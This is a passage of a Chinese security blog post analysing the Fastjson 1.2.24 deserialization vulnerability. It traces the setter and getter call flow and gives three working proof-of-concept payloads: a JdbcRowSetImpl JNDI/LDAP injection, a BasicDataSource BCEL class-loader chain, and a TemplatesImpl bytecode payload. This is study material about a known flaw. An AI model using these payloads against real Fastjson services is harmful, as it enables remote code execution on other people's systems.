+<p>跟进JSON.toJSON，一路重载，</p>
+<p>来到<code>com.alibaba.fastjson.JSON#toJSON(java.lang.Object, com.alibaba.fastjson.serializer.SerializeConfig)</code></p>
+<p><img src="/2022/11/12/fastjson1.2.24/21.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后就结束了，总结一下：</p>
+<ol>
+<li>根据JavaBean获取反序列化器，然后遍历符合条件的setter、getter方法</li>
+<li>从JSON字符串中获取对应的字段、字段值</li>
+<li>使用默认构造器(无参构造器)实例化JavaBean</li>
+<li>反射调用对应的setter方法进行赋值，此时也有可能会有getter方法(需要符合条件)</li>
+<li>来到JSON.toJSON()，然后就是跟上面类似了，不过此处调用的是getter方法了</li>
+</ol>
+<h3 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h3><p>通过上面的分析，能够得出想要利用漏洞，需要注意的点：</p>
+<ol>
+<li>在setter或getter中存在危险方法的调用，或者间接的调用危险方法，当然默认构造器中也有可能</li>
+<li>setter或getter方法中存在危险方法、或间接调用了危险方法</li>
+<li>setter或getter方法是public修饰的，且不能是static</li>
+<li>setter方法需要满足参数数量为1，返回类型为void</li>
+<li>变量可控需要满足有对应的setter或者是满足条件的getter方法</li>
+</ol>
+<h4 id="POC1"><a href="#POC1" class="headerlink" title="POC1"></a>POC1</h4><ul>
+<li><p>JDK8u121</p>
+</li>
+<li><p>fastjson1.2.24</p>
+</li>
+</ul>
+<p>这里主要是利用了一个JNDI注入，在<code>com.sun.rowset.JdbcRowSetImpl#connect</code>中，存在一个JNDI注入</p>
+<p><img src="/2022/11/12/fastjson1.2.24/22.png" srcset="/img/loading.gif" lazyload></p>
+<p>经查找，在<code>com.sun.rowset.JdbcRowSetImpl#setAutoCommit</code>中调用了<code>connect()</code></p>
+<p><img src="/2022/11/12/fastjson1.2.24/23.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后来个简单测试，能够测试成功，也就代表这里基本上可以</p>
+<p><img src="/2022/11/12/fastjson1.2.24/24.png" srcset="/img/loading.gif" lazyload></p>
+<p>从上面知道，要控制的点主要是dataSource的值，还有就是去调用<code>setAutoCommit</code>这个方法(这个好弄，只要写了就能调用)</p>
+<p>来看一下dataSource这个值的写入点，很容易就能找到<code>javax.sql.rowset.BaseRowSet#setDataSourceName</code>，这个在其父类中</p>
+<p><img src="/2022/11/12/fastjson1.2.24/25.png" srcset="/img/loading.gif" lazyload></p>
+<p>再来看一下<code>com.sun.rowset.JdbcRowSetImpl#setDataSourceName</code>它自身的这个方法</p>
+<p><img src="/2022/11/12/fastjson1.2.24/26.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以基本上可以来构造paylaod了</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-attr">&quot;DataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:8085/YTUsllNt&quot;</span>,<span class="hljs-attr">&quot;AutoCommit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/12/fastjson1.2.24/27.png" srcset="/img/loading.gif" lazyload></p>
+<p>整个的调用流程是</p>
+<p><code>JdbcRowSetImpl#setDataSourceName</code>–&gt;</p>
+<p><code>BaseRowSet#setDataSourceName</code>–&gt;</p>
+<p><code>JdbcRowSetImpl#setAutoCommit</code>–&gt;</p>
+<p><code>JdbcRowSetImpl#connect</code></p>
+<h5 id="注意1"><a href="#注意1" class="headerlink" title="注意1"></a>注意1</h5><p>上面有一点没有提到，就是关于这些方法的调用顺序，代码内写的是根据首字母进行一个调用，但具体调用的顺序，跟传入的顺序也有关</p>
+<p><img src="/2022/11/12/fastjson1.2.24/28.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="注意2"><a href="#注意2" class="headerlink" title="注意2"></a>注意2</h5><p>这里是JNDI注入，所以对JDK的版本有依赖限制&lt;=jdk8u121，还需要出网</p>
+<h4 id="POC2"><a href="#POC2" class="headerlink" title="POC2"></a>POC2</h4><p>jdk8u191</p>
+<p>fastjson1.2.24</p>
+<p>所以，接下来就是需要一个可以不出网利用的，并且对JDK的版本没有限制的</p>
+<p><code>com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass</code>在这里，有个类加载的东西</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> Class <span class="hljs-title">loadClass</span><span class="hljs-params">(String class_name, <span class="hljs-keyword">boolean</span> resolve)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException</span>&#123;<br>    Class cl = <span class="hljs-keyword">null</span>;<br><br>    <span class="hljs-comment">/* First try: lookup hash table.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">if</span>((cl=(Class)classes.get(class_name)) == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-comment">/* Second try: Load system class using system class loader. You better</span><br><span class="hljs-comment">       * don&#x27;t mess around with them.</span><br><span class="hljs-comment">       */</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i &lt; ignored_packages.length; i++) &#123;		<span class="hljs-comment">// 类名的一个判断</span><br>            <span class="hljs-keyword">if</span>(class_name.startsWith(ignored_packages[i])) &#123;<br>                cl = deferTo.loadClass(class_name);	<span class="hljs-comment">// 	最终的加载类的地方</span><br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(cl == <span class="hljs-keyword">null</span>) &#123;<br>            JavaClass clazz = <span class="hljs-keyword">null</span>;<br><br>            <span class="hljs-comment">//  Third try: Special request?</span><br>            <span class="hljs-keyword">if</span>(class_name.indexOf(<span class="hljs-string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="hljs-number">0</span>)	<span class="hljs-comment">// 翻译一下 当class_name 中存在 $$BCEL$$</span><br>                clazz = createClass(class_name);	<span class="hljs-comment">// 会创建这个类</span><br>            <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// Fourth try: Load classes via repository</span><br>                <span class="hljs-keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="hljs-keyword">null</span>) &#123;<br>                    clazz = modifyClass(clazz);<br>                &#125; <span class="hljs-keyword">else</span>&#123;...&#125;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span>(clazz != <span class="hljs-keyword">null</span>) &#123;	<span class="hljs-comment">// createClass()执行成功时</span><br>                <span class="hljs-keyword">byte</span>[] bytes  = clazz.getBytes();	<span class="hljs-comment">// 获取字节码</span><br>                cl = defineClass(class_name, bytes, <span class="hljs-number">0</span>, bytes.length);	<span class="hljs-comment">// 调用defineClass()进行动态类加载</span><br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-comment">// Fourth try: Use default class loader				// defineClass最终还是调用loadClass</span><br>                cl = Class.forName(class_name);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(resolve)<br>            resolveClass(cl);<br>    &#125;<br><br>    classes.put(class_name, cl);<br><br>    <span class="hljs-keyword">return</span> cl;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>简单测试一下，ok了，接下来就是要找一下，在哪个set方法中调用了它就ok了</p>
+<p><img src="/2022/11/12/fastjson1.2.24/29.png" srcset="/img/loading.gif" lazyload></p>
+<p>在<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createConnectionFactory</code>这里，有一个forName</p>
+<p><img src="/2022/11/12/fastjson1.2.24/30.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后就是，找下这两个值有没有对应的setter方法</p>
+<p><img src="/2022/11/12/fastjson1.2.24/31.png" srcset="/img/loading.gif" lazyload></p>
+<p>很好，都有对应的setter方法，并且也满足相应的要求，接下来就是去找哪个setter方法中直接或间接的调用了<code>BasicDataSource#createConnectionFactory</code>，很幸运，有，大致的调用如下：</p>
+<blockquote>
+<p>org.apache.tomcat.dbcp.dbcp2.BasicDataSource#getConnection<br>    org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createDataSource<br>        org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createConnectionFactory<br>            java.lang.Class#forName(java.lang.String, boolean, java.lang.ClassLoader<br>                com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass</p>
+</blockquote>
+<p><img src="/2022/11/12/fastjson1.2.24/32.png" srcset="/img/loading.gif" lazyload></p>
+<p>先正常测试一下：</p>
+<p><img src="/2022/11/12/fastjson1.2.24/33.png" srcset="/img/loading.gif" lazyload></p>
+<p>测试OK，下一步就是写POC了</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;\<span class="hljs-attr">&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;DriverClassName\&quot;:\&quot;$$BCEL$$&quot;</span> + encode + <span class="hljs-attr">&quot;\&quot;,\&quot;DriverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="注意1-1"><a href="#注意1-1" class="headerlink" title="注意1"></a>注意1</h5><p><code>BasicDataSource#getConnection</code>入口点是getter，所以需要是parseObject()</p>
+<h5 id="问题1"><a href="#问题1" class="headerlink" title="问题1:"></a>问题1:</h5><p>其实也尝试了<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource#setLogWriter</code>这个setter方法，但其中的参数是一个类，且没有无参构造器，就导致无法传，传<code>null</code>也不行</p>
+<h4 id="POC3"><a href="#POC3" class="headerlink" title="POC3"></a>POC3</h4><p>在CB链中，<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>有这么一个类，该类中有个</p>
+<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</code>，是在CB链中的一部分，并且也是个getter方法，通过上面的分析，得知在parse时，调用getter方法需要满足以下：</p>
+<ol>
+<li>方法名长度大于4</li>
+<li>方法名第4位是大写字母</li>
+<li>以get开头</li>
+<li>public修饰</li>
+<li>参数值为空</li>
+<li>返回类型满足：<code>Collection/Map/AtomicBoolean/AtomicIntegerAtomicLong</code></li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Properties继承HashTable,HashTable又实现Map接口</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Properties <span class="hljs-title">getOutputProperties</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> newTransformer().getOutputProperties();<br>    &#125;<br>   	...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>所以这个<code>getOutputProperties</code>在parse时也能够调用，回忆一下前面的流程，从<code>getOutputProperties</code></p>
+<blockquote>
+<p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</p>
+<p>​    com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer</p>
+<p>​        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance</p>
+<p>​            com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses</p>
+<p>​                com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoader#defineClass</p>
+</blockquote>
+<p>流程大概就是这么个流程，然后接下来就是需要去传数据了，走下流程，看下需要哪些东西</p>
+<p><img src="/2022/11/12/fastjson1.2.24/34.png" srcset="/img/loading.gif" lazyload></p>
+<p>再往下：</p>
+<p><img src="/2022/11/12/fastjson1.2.24/35.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后就没啥了，需要更改的字段就只有这仨了</p>
+<p>接下来就是写POC了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>  <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<br>  <span class="hljs-string">&quot;_name&quot;</span>: <span class="hljs-string">&quot;Mechoy&quot;</span>,<br>  <span class="hljs-string">&quot;_tfactory&quot;</span>: <span class="hljs-keyword">null</span>,<br>  <span class="hljs-string">&quot;_bytecodes&quot;</span>: [<br>    <span class="hljs-string">&quot;恶意类的base64编码&quot;</span><br>  ],<br>  <span class="hljs-string">&quot;OutputProperties&quot;</span>: <span class="hljs-keyword">null</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h5 id="问题1-1"><a href="#问题1-1" class="headerlink" title="问题1"></a>问题1</h5><p><code>_name</code>,<code>_bytecodes</code>,<code>_tfactory</code>这几个字段没有符合条件的setter方法，并且该字段都是私有的，所以这里需要在parse中加入：<code>Feature.SupportNonPublicField</code>才能够实现控制私有属性的值</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">parse(s,Feature.SupportNonPublicField);<br>parseObject(s,Feature.SupportNonPublicField);<br></code></pre></td></tr></table></figure>
+
+<h5 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h5><p>关于传入数据时，.class文件如何的字符数组如何传</p>
+<p>当Fastjson在解析JSON字符串时，如果遇到属性值是Base64编码的字符串，它会<strong>自动将其解码</strong>为原始的二进制数据，然后将其赋值给JavaBean的相应属性。</p>
+<p><code>com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze</code>在这里调用<code>lexer.bytesValue()</code>,其中会对属性值进行Base64解码</p>
+<h5 id="注意1-2"><a href="#注意1-2" class="headerlink" title="注意1"></a>注意1</h5><p>对于一些空值，在使用json传输的时候，最好是<code>&#123;&#125;</code>，<code>null</code>或者<code>&quot;null&quot;</code>或者””等都是在特定情况下才会实现的</p>
+<h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>fastjson的反序列化，也Java原生的反序列化是有较大的区别的：</p>
+<ol>
+<li>入口点，readObject  —-&gt; setter</li>
+<li>参数的赋值，直接赋值 —-&gt; 使用setter赋值或反射赋值</li>
+<li>fastjson反序列化需要对应类又无参构造器，原生不需要</li>
+</ol>
+<p>目前能想到的暂时就这仨，后面想到了再补充，接下来就是fastjson的绕过了</p>
+<h3 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/fastjson/fastjson-intro.html">Fastjson 使用指南</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1bD4y117Qh/?spm_id_from=333.999.0.0&vd_source=db93b94230228cb739b48f4f59e74abd">fastjson反序列化漏洞1-流程分析</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1pP411N726/?spm_id_from=333.999.0.0&vd_source=db93b94230228cb739b48f4f59e74abd">fastjson反序列化漏洞2-1.2.24利用</a></li>
+<li><a target="_blank" rel="noopener" href="https://ciyfly.github.io/2020/12/16/%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90fastjson1-2-24/">复现及分析fastjson1.2.24</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/CHCH998/article/details/106665974/">在JSON中表示null</a></li>
+</ul>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/">#Java安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>FastJson1.2.24</div>
+      <div>http://example.com/2022/11/12/fastjson1.2.24/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Mechoy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年11月12日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/11/19/FastjsonBypass/" title="Fastjson Bypass">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Fastjson Bypass</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="shiro550反序列化">
+                        <span class="hidden-mobile">shiro550反序列化</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://mechoy.github.io" target="_blank" rel="nofollow noopener"><span>Mechoy</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
